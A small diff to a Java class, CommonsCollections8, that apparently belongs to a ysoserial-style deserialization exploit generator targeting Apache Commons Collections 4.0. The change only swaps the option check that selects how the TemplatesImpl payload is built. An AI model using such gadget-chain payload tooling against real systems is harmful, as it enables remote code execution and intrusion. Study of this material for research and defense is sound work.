@@ -13,6 +13,7 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
 
 import java.util.Comparator;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
@@ -23,7 +24,7 @@ public class CommonsCollections8 implements ObjectPayload<TreeBag>{
 
     public TreeBag getObject(PayloadType type, String... param) throws Exception {
         final Object templates;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templates = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templates = Gadgets.createTemplatesImpl(type, param);
